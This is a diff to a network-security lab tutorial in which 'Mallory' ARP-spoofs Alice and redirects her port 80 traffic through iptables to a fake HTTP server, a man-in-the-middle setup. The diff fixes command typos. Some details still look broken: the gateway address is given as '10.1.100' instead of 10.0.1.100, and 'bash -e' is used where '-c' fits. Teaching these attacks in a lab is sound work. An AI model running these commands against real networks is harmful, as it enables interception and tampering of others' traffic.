@@ -19,7 +19,7 @@ In this part, Mallory wants to disrupt the communication between Alice and the G
 *As Mallory (terminal 1), broadcast spoofed ARP messages to Alice (10.0.1.101) pretending to be the gateway (10.0.1.100):
 
 ```shell
-vagrant@mallory:~$ arpspoof -i eth1 -t 10.0.1.101 10.1.100
+vagrant@mallory:~$ sudo arpspoof -i eth1 -t 10.0.1.101 10.1.100
 ```
 
 Finally:
@@ -35,7 +35,7 @@ In this part, rather than disrupting the communication between Alice and the Gat
 
 ```shell
 vagrant@mallory:~$ sudo bash -e "echo '1' > /proc/sys/net/ipv4/ip_forward"
-vagrant@mallory:~$ sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --o-port 8080
+vagrant@mallory:~$ sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 ```
 
 *As Mallory* (terminal 2), start a fake HTTP server listening on port 8080
